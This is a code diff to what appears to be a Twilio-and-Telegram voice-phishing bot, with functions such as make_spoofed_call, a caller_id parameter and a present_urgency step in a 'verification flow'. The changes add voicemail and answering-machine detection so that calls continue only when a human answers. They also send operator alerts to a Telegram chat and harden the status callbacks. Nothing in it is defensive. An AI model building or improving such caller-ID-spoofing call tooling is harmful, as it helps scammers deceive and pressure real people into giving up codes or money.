@@ -2268,7 +2268,10 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
             "method": "POST",
         }
         # Call lifecycle and recording callbacks
-        call_params["status_callback"] = f"{NGROK_URL.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
+        status_cb = f"{NGROK_URL.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
+        if chat_id:
+            status_cb += f"&chat_id={quote_plus(str(chat_id))}"
+        call_params["status_callback"] = status_cb
         call_params["status_callback_method"] = "POST"
         rec_cb = f"{NGROK_URL.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
         if chat_id:
@@ -2677,7 +2680,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")
 
                 webhook_url = (
-                    f"{NGROK_URL.rstrip('/')}/focus_listen_flow"
+                    f"{NGROK_URL.rstrip('/')}/amd_hold"
                     f"?user_id={quote_plus(str(user_id_str))}"
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
@@ -3363,7 +3366,7 @@ def voice():
         resp.hangup()
         return Response(str(resp), content_type="application/xml")
 
-    redirect_url = f"/focus_listen_flow?user_id={quote_plus(str(user_id))}"
+    redirect_url = f"/amd_hold?user_id={quote_plus(str(user_id))}"
     if chat_id is not None:
         redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
 
@@ -3810,6 +3813,26 @@ def _is_positive_acknowledgment(text: str) -> bool:
     return any(signal in normalized for signal in positive_signals)
 
 
+def _looks_like_machine_or_voicemail(text: str) -> bool:
+    if not text:
+        return False
+    normalized = text.strip().lower()
+    machine_signals = [
+        "voicemail",
+        "recorded",
+        "recording",
+        "answering machine",
+        "automated",
+        "robot",
+        "machine",
+        "mailbox",
+        "leave a message",
+        "press 1",
+        "press one",
+    ]
+    return any(signal in normalized for signal in machine_signals)
+
+
 @app.route("/handle_greeting", methods=["POST"])
 @twilio_request_logger("/handle_greeting")
 def handle_greeting():
@@ -3865,12 +3888,22 @@ def handle_greeting():
         return Response(str(resp), content_type="application/xml")
 
     if digits == "1" or _is_positive_acknowledgment(speech_result):
+        if chat_id is not None:
+            send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the verification flow.")
         session["greeting_attempts"] = 0
         redirect_url = f"/present_urgency?user_id={quote_plus(str(user_id))}"
         if chat_id is not None:
             redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
         resp = VoiceResponse()
         resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
+
+    if _looks_like_machine_or_voicemail(speech_result):
+        if chat_id is not None:
+            send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+        resp = VoiceResponse()
+        resp.say("Thank you. Goodbye.")
+        resp.hangup()
         return Response(str(resp), content_type="application/xml")
 
     session["greeting_attempts"] += 1
@@ -3958,12 +3991,22 @@ def handle_acknowledgment():
     )
 
     if digits == "1" or _is_positive_acknowledgment(speech_result):
+        if chat_id is not None:
+            send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the verification flow.")
         session["ack_attempts"] = 0
         redirect_url = f"/present_urgency?user_id={quote_plus(str(user_id))}"
         if chat_id is not None:
             redirect_url += f"&chat_id={quote_plus(str(chat_id))}"
         resp = VoiceResponse()
         resp.redirect(redirect_url, method="POST")
+        return Response(str(resp), content_type="application/xml")
+
+    if _looks_like_machine_or_voicemail(speech_result):
+        if chat_id is not None:
+            send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
+        resp = VoiceResponse()
+        resp.say("Thank you. Goodbye.")
+        resp.hangup()
         return Response(str(resp), content_type="application/xml")
 
     session["ack_attempts"] += 1
@@ -4423,6 +4466,10 @@ def twilio_status():
                 session["answered_by"] = answered_by
             elif session is not None and not answered_by:
                 session.setdefault("answered_by", "unknown")
+            if session is not None and not chat_id and session.get("chat_id"):
+                chat_id = session.get("chat_id")
+            elif session is not None and not chat_id and session.get("status_chat_id"):
+                chat_id = session.get("status_chat_id")
 
         logger.info(
             f"📊 Call status update: {call_sid} -> {status} (answered_by={answered_by or 'unknown'} user_id={user_id} chat_id={chat_id})"
@@ -4486,7 +4533,10 @@ def twilio_status():
                         kb = types.InlineKeyboardMarkup()
                         kb.add(types.InlineKeyboardButton("Main Menu", callback_data="show_main_menu"))
                         if chat_id:
-                            bot.send_message(int(chat_id), summary, reply_markup=kb)
+                            try:
+                                bot.send_message(int(chat_id), summary, reply_markup=kb)
+                            except Exception as send_ex:
+                                logger.warning(f"Failed to send final call summary to Telegram: {send_ex}")
                 except Exception as summ_ex:
                     logger.warning(f"Failed to send final call summary: {summ_ex}")
             cleanup_call_session(call_sid)
